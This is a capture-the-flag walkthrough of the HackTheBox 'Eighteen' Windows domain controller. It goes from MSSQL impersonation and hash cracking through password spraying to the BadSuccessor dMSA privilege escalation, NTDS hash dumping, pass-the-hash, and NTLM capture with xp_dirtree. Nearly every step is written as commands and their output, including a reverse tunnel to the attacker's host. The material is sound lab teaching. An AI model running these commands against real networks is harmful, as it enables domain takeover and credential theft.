---
icon: compress
cover: ../../../../.gitbook/assets/Screenshot 2026-04-13 073748.png
coverY: 4.778126964173476
---

# HTB-EIGHTEEN

<figure><img src="../../../../.gitbook/assets/image (659).png" alt=""><figcaption></figcaption></figure>

## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scan

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ rustscan -a 10.129.87.193 -blah blah 
```

```
Open 10.129.87.193:80     http   Microsoft IIS httpd 10.0
Open 10.129.87.193:1433   mssql  Microsoft SQL Server 2022 RTM
Open 10.129.87.193:5985   http   Microsoft HTTPAPI httpd 2.0 (WinRM)

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 RTM (16.00.1000.00)
| ms-sql-ntlm-info:
|   Target_Name: EIGHTEEN
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: eighteen.htb
|   DNS_Computer_Name: DC01.eighteen.htb
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Three ports HTTP, MSSQL, and WinRM. The NTLM info leaks the hostname as `DC01` which tells us straight away we're talking directly to a Domain Controller. Added `10.129.87.193 eighteen.htb dc01.eighteen.htb` to `/etc/hosts` and moved on.

One thing to note immediately: nmap (well, rustscan here) is reporting a 7-hour clock skew. That's going to matter later when we do anything Kerberos related, so keep that in the back of your head.

### vHost Enumeration

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ ffuf -u http://10.129.87.193 -H "Host: FUZZ.eighteen.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```

Nothing came back. Single vhost, no subdomains. Simple attack surface.

### Directory Brute Force

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ feroxbuster -u http://eighteen.htb
```

```
302  GET  http://eighteen.htb/logout      => http://eighteen.htb/
200  GET  http://eighteen.htb/login
302  GET  http://eighteen.htb/admin       => http://eighteen.htb/login
200  GET  http://eighteen.htb/register
302  GET  http://eighteen.htb/dashboard   => http://eighteen.htb/login
200  GET  http://eighteen.htb/features
```

The `/admin` route exists but redirects to `/login` — so there is an admin panel, we just can't reach it as a regular user. Something to come back to.

***

## Web Application

Navigating to `http://eighteen.htb/` shows a Flask-based personal finance tracker. The 404 page is Flask's default, and the HTTP headers only show IIS meaning Flask is sitting behind IIS here. Standard stuff.

<figure><img src="../../../../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

The box gives us starting creds: `kevin:iNa2we6haRj2gaw!`

Tried them on the web login didn't work. Tried WinRM with nxc — also failed. But MSSQL? Let's check.

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ nxc mssql 10.129.87.193 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth
```

```
MSSQL  10.129.87.193  1433  DC01  [+] DC01\kevin:iNa2we6haRj2gaw!
```

Local MSSQL auth works. Kevin is a SQL login, not a domain account. That's the way in.

***

## MSSQL Enumeration

#### Getting a Shell and Initial Enum

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ impacket-mssqlclient eighteen.htb/kevin:'iNa2we6haRj2gaw!'@10.129.87.193
```

```
SQL (kevin  guest@master)>
```

Kevin is a guest. Can't run `xp_cmdshell`, can't reconfigure the server, can't touch the `financial_planner` database directly. Pretty boxed in. Let's see what privileges are actually available.

```
SQL (kevin  guest@master)> enum_db
```

```
name                is_trustworthy_on
-----------------   -----------------
master                              0
tempdb                              0
model                               0
msdb                                1
financial_planner                   0
```

```
SQL (kevin  guest@master)> enum_impersonate
```

```
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev
```

There it is. Kevin can impersonate `appdev`. In MSSQL, impersonation means you can literally `EXECUTE AS LOGIN = 'appdev'` and run commands under that identity without knowing their password. It's a commonly misconfigured permission that admins set up thinking it's harmless for app accounts.

```
SQL (kevin  guest@master)> exec_as_login appdev

SQL (appdev  appdev@master)> use financial_planner
```

```
INFO(DC01): Line 1: Changed database context to 'financial_planner'.
```

Now we're in.

#### Pulling the Users Table

```
SQL (appdev  appdev@financial_planner)> SELECT name FROM sys.tables WHERE type = 'u';
```

```
name
-----------
users
incomes
expenses
allocations
analytics
visits
```

```
SQL (appdev  appdev@financial_planner)> SELECT * FROM users;
```

```
id    full_name  username  email                password_hash                                                                                            is_admin
----  ---------  --------  ------------------   ------------------------------------------------------------------------------------------------------   --------
1002  admin      admin     admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133   1
```

Single admin user, PBKDF2-SHA256 hash with 600,000 iterations. High iteration count means it's going to be slow to crack, but let's see what we're working with.

#### Cracking the Admin Hash

The hash is in Werkzeug format: `pbkdf2:sha256:<iterations>$<salt>$<hex_hash>`. Hashcat mode 10900 (PBKDF2-HMAC-SHA256) wants it in a different structure: `sha256:<iterations>:<salt_base64>:<hash_base64>`.

The tricky part: the salt looks like it's already in base64 alphabet characters, but it's actually ASCII text — so you need to base64-encode it properly. The hex hash just needs decoding from hex then re-encoding as base64.

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ echo -n '0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133' | xxd -r -p | base64 -w0
```

```
BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ echo -n 'AMtzteQIG7yAbZIa' | base64 -w0
```

```
QU10enRlUUlHN3lBYlpJYQ==
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ hashcat -m 10900 'sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=' /usr/share/wordlists/rockyou.txt
```

```
sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1
```

Mode 10900 because that's exactly what PBKDF2-HMAC-SHA256 maps to in hashcat. Cracked to `iloveyou1`. Takes a while at 600k iterations, but gets there.

**Alternative approach:** If you don't want to manually reformat, there's a Python script approach that does the same thing cleanly:

```python
import base64, codecs, re, sys

h = 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133'
m = re.match(r'pbkdf2:sha256:(\d*)\$([^\$]*)\$(.*)', h)
iterations = m.group(1)
salt = m.group(2)
hashe = m.group(3)
print(f"sha256:{iterations}:{base64.b64encode(salt.encode()).decode()}:{base64.b64encode(codecs.decode(hashe,'hex')).decode()}")
```

Either way you get the same formatted string for hashcat.

### Getting Admin on the Web App

Log in at `http://eighteen.htb/login` as `admin:iloveyou1`. Admin panel at `/admin` is now accessible and shows the app config Flask Financial Planner v1.0, database is MSSQL on `dc01.eighteen.htb`.

<figure><img src="../../../../.gitbook/assets/image (661).png" alt=""><figcaption></figcaption></figure>

Nothing directly exploitable here through the web UI, but now we know we're looking for more.

<figure><img src="../../../../.gitbook/assets/image (662).png" alt=""><figcaption></figcaption></figure>

**Alternate path:** If you didn't bother cracking the hash, you can just promote yourself. Register a test account through the web UI, then back in MSSQL:

```
SQL (appdev  appdev@financial_planner)> UPDATE users SET is_admin = 1 WHERE username = 'test';
```

Same result, different path. Both land you in the admin panel.

***

### Domain User Enumeration

RID brute through MSSQL this works because MSSQL on a DC can query local SIDs, and nxc will cycle through them and resolve names.

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ nxc mssql 10.129.87.193 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute
```

```
MSSQL  10.129.87.193  1433  DC01  [+] DC01\kevin:iNa2we6haRj2gaw!
MSSQL  10.129.87.193  1433  DC01  500:  EIGHTEEN\Administrator
MSSQL  10.129.87.193  1433  DC01  1601: EIGHTEEN\mssqlsvc
MSSQL  10.129.87.193  1433  DC01  1603: EIGHTEEN\HR
MSSQL  10.129.87.193  1433  DC01  1604: EIGHTEEN\IT
MSSQL  10.129.87.193  1433  DC01  1605: EIGHTEEN\Finance
MSSQL  10.129.87.193  1433  DC01  1606: EIGHTEEN\jamie.dunn
MSSQL  10.129.87.193  1433  DC01  1607: EIGHTEEN\jane.smith
MSSQL  10.129.87.193  1433  DC01  1608: EIGHTEEN\alice.jones
MSSQL  10.129.87.193  1433  DC01  1609: EIGHTEEN\adam.scott
MSSQL  10.129.87.193  1433  DC01  1610: EIGHTEEN\bob.brown
MSSQL  10.129.87.193  1433  DC01  1611: EIGHTEEN\carol.white
MSSQL  10.129.87.193  1433  DC01  1612: EIGHTEEN\dave.green
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ nxc mssql 10.129.87.193 -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute | grep -oP 'EIGHTEEN\\\w+\.\w+' | cut -d '\' -f2 | tee users.txt
```

```
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
```

Seven domain users. Now spray `iloveyou1` (the cracked admin password) against all of them over WinRM and see if anyone reuses it.

***

### Getting a Foothold - adam.scott

#### Password Spray

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ nxc winrm 10.129.87.193 -u users.txt -p 'iloveyou1' --continue-on-success
```

```
WINRM  10.129.87.193  5985  DC01  [-] eighteen.htb\jamie.dunn:iloveyou1
WINRM  10.129.87.193  5985  DC01  [-] eighteen.htb\jane.smith:iloveyou1
WINRM  10.129.87.193  5985  DC01  [-] eighteen.htb\alice.jones:iloveyou1
WINRM  10.129.87.193  5985  DC01  [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)
WINRM  10.129.87.193  5985  DC01  [-] eighteen.htb\bob.brown:iloveyou1
WINRM  10.129.87.193  5985  DC01  [-] eighteen.htb\carol.white:iloveyou1
WINRM  10.129.87.193  5985  DC01  [-] eighteen.htb\dave.green:iloveyou1
```

`adam.scott:iloveyou1` - classic password reuse. The web app admin set a weak password and a domain user just happened to use the same one.

#### WinRM Shell

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ evil-winrm -i dc01.eighteen.htb -u adam.scott -p iloveyou1
```

```
Evil-WinRM shell v3.5
*Evil-WinRM* PS C:\Users\adam.scott\Documents>
```

User flag down. Now let's poke around before going for root.

***

### Enumeration as adam.scott

#### OS Version Check

```powershell
*Evil-WinRM* PS C:\> Get-ComputerInfo | Select WindowsProductName, OSDisplayVersion
```

```
WindowsProductName        OSDisplayVersion
------------------        ----------------
Windows Server 2025 Datacenter  24H2
```

Windows Server 2025. That's new. Like, _very_ new. And running at the 2025 functional level too:

```powershell
*Evil-WinRM* PS C:\> Get-ADDomain | Select DomainMode
```

```
DomainMode
----------
Windows2025Domain
```

This is significant. Windows Server 2025 introduced Delegated Managed Service Accounts (dMSA), and there's a relatively fresh privilege escalation technique called BadSuccessor that abuses them. When a box is running bleeding-edge Windows and the domain functional level is maxed out, that's usually a hint.

#### Checking Group Membership

```powershell
*Evil-WinRM* PS C:\> whoami /groups
```

```
EIGHTEEN\IT  Group  S-1-5-21-1152179935-589108180-1989892463-1604  Mandatory group, Enabled
```

adam.scott is in the `IT` group. Keep that in mind.

#### Source Code Discovery

The web app is at `C:\inetpub\eighteen.htb`. The `app.py` file has the database config hardcoded:

```powershell
*Evil-WinRM* PS C:\inetpub\eighteen.htb> type app.py
```

```python
DB_CONFIG = {
    'server': 'dc01.eighteen.htb',
    'database': 'financial_planner',
    'username': 'appdev',
    'password': 'MissThisElite$90',
    'driver': '{ODBC Driver 17 for SQL Server}',
    'TrustServerCertificate': 'True'
}
```

Plaintext creds for `appdev` in source code a classic. `appdev:MissThisElite$90`. We already had impersonation access to this account through MSSQL, but now we have the actual password. Tested it against WinRM and SMB, doesn't get us anything new, but worth noting.

#### Checking for BadSuccessor

Akamai released a PowerShell script specifically to check which OUs are vulnerable to BadSuccessor. Let me grab that and run it.

```powershell
*Evil-WinRM* PS C:\programdata> wget 10.10.14.24/Get-BadSuccessorOUPermissions.ps1 -outfile Get-BadSuccessorOUPermissions.ps1
*Evil-WinRM* PS C:\programdata> .\Get-BadSuccessorOUPermissions.ps1
```

```
Identity    OUs
--------    ---
EIGHTEEN\IT {OU=Staff,DC=eighteen,DC=htb}
```

The `IT` group — which adam.scott is a member of — has `CreateChild` rights on `OU=Staff`. That's everything we need for BadSuccessor.

***

## Privilege Escalation - BadSuccessor (CVE-2025-53779)

#### What's Actually Going On Here

BadSuccessor abuses the dMSA migration feature in Windows Server 2025. The idea behind dMSA is that when you want to retire a legacy service account, you create a dMSA as its successor. You set `msDS-ManagedAccountPrecededByLink` to point at the old account, set `msDS-DelegatedMSAState = 2` (migration complete), and the KDC will issue tickets for the dMSA that carry the full group membership of the original account.

The problem: the KDC never checks whether the migration was actually authorized. It just reads the attribute and trusts it. So if you have `CreateChild` rights on any OU for dMSA objects, you can create a fake migration pointing at Administrator, request a ticket for it, and you'll get a TGT with Domain Admin groups in the PAC.

Microsoft originally pushed back and said this wasn't a bug, then quietly patched it and assigned CVE-2025-53779. Classic.

#### Setting Up the Tunnel

We need a SOCKS proxy so we can use impacket tools from our Kali box against the internal domain. Chisel handles this cleanly.

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ ./chisel_linux server -p 9001 --reverse
```

```powershell
*Evil-WinRM* PS C:\programdata> upload chisel.exe
*Evil-WinRM* PS C:\programdata> .\chisel.exe client 10.10.14.24:9001 R:socks
```

```
2026/04/10 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Tunnel up. Proxychains configured to use `socks5 127.0.0.1 1080`.

#### Time Sync

Kerberos has a hard 5-minute clock skew tolerance. Our clocks are 7 hours off. Fix it before anything Kerberos-related.

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ sudo ntpdate -s 10.129.87.193
```

If UDP 123 isn't open (it wasn't here), pull the time from the WinRM shell and set it manually:

```powershell
*Evil-WinRM* PS C:\> Get-Date -Format "yyyy-MM-dd HH:mm:ss"
2026-04-10 01:21:54
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ sudo date -u -s "2026-04-10 01:21:54"
```

### Method 1: Remote Exploit via NetExec

There's a BadSuccessor module in a NetExec fork (PR not yet merged into main as of this writeup). Clone it, install it, and run:

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ git clone https://github.com/azoxlpf/NetExec.git
└─$ cd NetExec && git checkout feat/refactor-badsuccessor
└─$ uv tool install .
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ proxychains -q nxc ldap dc01.eighteen.htb -u adam.scott -p 'iloveyou1' -M badsuccessor -o TARGET_OU='OU=Staff,DC=eighteen,DC=htb' DMSA_NAME=sn0x TARGET_ACCOUNT=Administrator
```

```
BADSUCCE...  DC01  [+] dMSA 'sn0x$' created at CN=sn0x,OU=Staff,DC=eighteen,DC=htb
BADSUCCE...  DC01  Migration state: 2 (completed)
BADSUCCE...  DC01  Target account: CN=Administrator,CN=Users,DC=eighteen,DC=htb
BADSUCCE...  DC01  EncryptionTypes.aes256_cts_hmac_sha1_96: c23d2ee88cca21b1fed4a801...
BADSUCCE...  DC01  EncryptionTypes.rc4_hmac: dad23aa0e8e234df8a524f58d065e3fc
BADSUCCE...  DC01  [+] Service ticket saved to sn0x$.ccache
```

One command. dMSA created, linked to Administrator, ticket saved. Verify it works:

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ KRB5CCNAME=sn0x\$.ccache proxychains -q nxc smb dc01.eighteen.htb --use-kcache
```

```
SMB  dc01.eighteen.htb  445  DC01  [+] eighteen.htb\sn0x$ from ccache (Pwn3d!)
```

### Method 2: impacket getST

If you want more control, impacket v0.13.0 added native dMSA support. Use `faketime` to handle the clock skew without touching the system clock.

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ proxychains -q faketime -f +7h getST.py 'EIGHTEEN.HTB/adam.scott'@dc01.eighteen.htb \
    -impersonate 'sn0x$' \
    -self \
    -dmsa
```

```
[*] Getting TGT for user
[*] Impersonating sn0x$
[*] Requesting S4U2self
[*] EncryptionTypes.aes256_cts_hmac_sha1_96: ...
[*] Saving ticket in sn0x$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ export KRB5CCNAME=sn0x\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

### Method 3: On-Box with BadSuccessor Binary + Rubeus

If you want to stay entirely on the box, there's a compiled BadSuccessor binary and Rubeus can handle the ticket side.

Upload both tools, then:

```powershell
*Evil-WinRM* PS C:\programdata> .\BadSuccessor.exe find
```

```
[*] OUs you have write access to:
    -> OU=Staff,DC=eighteen,DC=htb
       Privileges: GenericWrite, GenericAll, CreateChild
```

```powershell
*Evil-WinRM* PS C:\programdata> .\BadSuccessor.exe escalate `
    -targetOU "OU=Staff,DC=eighteen,DC=htb" `
    -dmsa sn0x_dmsa `
    -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" `
    -dnshostname sn0x_dmsa `
    -user adam.scott `
    -dc-ip 127.0.0.1
```

```
[+] Created dMSA 'sn0x_dmsa' in 'OU=Staff,DC=eighteen,DC=htb', linked to 'CN=Administrator,CN=Users,DC=eighteen,DC=htb'
```

Then Rubeus to request the TGT:

```powershell
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgt /user:adam.scott /password:iloveyou1 /enctype:aes256 /opsec /nowrap
```

Take the base64 ticket from that output and pass it into:

```powershell
*Evil-WinRM* PS C:\programdata> .\Rubeus.exe asktgs /targetuser:sn0x_dmsa$ /service:krbtgt/eighteen.htb /dmsa /opsec /nowrap /ptt /ticket:<BASE64_TICKET>
```

With `/ptt` it's loaded straight into memory. Convert kirbi to ccache if you want to use impacket tools from Kali:

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ echo -n '<BASE64>' | base64 -d > dmsa.kirbi
└─$ impacket-ticketConverter dmsa.kirbi dmsa.ccache
└─$ export KRB5CCNAME=dmsa.ccache
```

***

### Dumping Hashes and Root

#### Dump NTDS

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ KRB5CCNAME=sn0x\$.ccache proxychains -q nxc smb dc01.eighteen.htb --use-kcache --ntds
```

```
SMB  dc01.eighteen.htb  445  DC01  [+] eighteen.htb\sn0x$ from ccache (Pwn3d!)
SMB  dc01.eighteen.htb  445  DC01  [+] Dumping the NTDS...
SMB  dc01.eighteen.htb  445  DC01  Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
SMB  dc01.eighteen.htb  445  DC01  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB  dc01.eighteen.htb  445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a7c7a912503b16d8402008c1aebdb649:::
SMB  dc01.eighteen.htb  445  DC01  mssqlsvc:1601:aad3b435b51404eeaad3b435b51404ee:c44d16951b0810e8f3bbade300966ec4:::
SMB  dc01.eighteen.htb  445  DC01  eighteen.htb\adam.scott:1609:aad3b435b51404eeaad3b435b51404ee:9964dae494a77414e34aff4f34412166:::
[...snip...]
```

Or with secretsdump if you prefer impacket:

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ proxychains -q faketime -f +7h impacket-secretsdump -no-pass -k dc01.eighteen.htb
```

Either way, Administrator's NT hash is `0b133be956bfaddf9cea56701affddec`.

#### Root Shell

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ evil-winrm -i dc01.eighteen.htb -u administrator -H 0b133be956bfaddf9cea56701affddec
```

***

## Also Noteworthy - NTLM Capture via xp\_dirtree

One extra technique worth mentioning: while impersonating `appdev` in MSSQL, you can force the SQL Server service account (`mssqlsvc`) to authenticate outbound to your Responder.

```
┌──(sn0x㉿sn0x)-[~/HTB/Eighteen]
└─$ sudo responder -I tun0 -v
```

```
SQL (appdev  appdev@financial_planner)> EXEC master..xp_dirtree '\\10.10.14.24\share';
```

```
[SMB] NTLMv2 Hash : mssqlsvc::EIGHTEEN:56196edf973f9535:58E7A96DDCC4A24C6581B60F5D6B0A61:...
```

The hash didn't crack against rockyou here (service accounts usually have decent passwords), but the technique is valid and worth knowing. If this were an internal engagement that hash might be crackable or relayable.

***

### Attack Chain

```
[Initial Creds: kevin:iNa2we6haRj2gaw!]
          |
          v
[MSSQL Login - local auth]
          |
          v
[Impersonate appdev via EXECUTE AS LOGIN]
          |
          v
[Access financial_planner DB]
          |
    ______v______
   |             |
   v             v
[Extract admin hash]  [Promote own user to is_admin=1]
   |             |
   v             |
[Crack: iloveyou1]    |
   |_____________|
          |
          v
[RID Brute via MSSQL -> 7 domain users]
          |
          v
[Password Spray: iloveyou1 -> adam.scott (Pwn3d!)]
          |
          v
[WinRM Shell as adam.scott]
          |
          v
[OS: Windows Server 2025, IT group member]
[adam.scott in IT -> CreateChild on OU=Staff]
          |
          v
[BadSuccessor (CVE-2025-53779)]
[Create dMSA linked to Administrator]
          |
          v
[TGT with Domain Admin PAC]
          |
          v
[DCSync / NTDS Dump]
          |
          v
[Pass-the-Hash -> Administrator shell]
          |
          v
[root.txt]
```

***

### Techniques I Used

| Technique                                        | Where Used                          |
| ------------------------------------------------ | ----------------------------------- |
| MSSQL Local Auth                                 | Initial access with kevin           |
| MSSQL User Impersonation                         | kevin → appdev via EXECUTE AS LOGIN |
| PBKDF2-SHA256 Hash Cracking (hashcat mode 10900) | Cracking admin web app hash         |
| RID Brute Force via MSSQL                        | Domain user enumeration             |
| Password Spraying (nxc)                          | Finding adam.scott:iloveyou1        |
| BadSuccessor / CVE-2025-53779                    | dMSA abuse for privilege escalation |
| SOCKS Proxy via Chisel                           | Routing impacket traffic through DC |
| Kerberos Clock Sync (faketime / date)            | Dealing with 7-hour skew            |
| S4U2Self (getST.py --dmsa)                       | Requesting TGT as malicious dMSA    |
| DCSync via nxc --ntds                            | Dumping all domain hashes           |
| Pass-the-Hash (evil-winrm -H)                    | Admin shell with NT hash            |
| NTLM Capture via xp\_dirtree + Responder         | Capturing mssqlsvc NTLMv2 hash      |
| Credential Discovery in Source Code              | appdev:MissThisElite$90 in app.py   |

<figure><img src="../../../../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
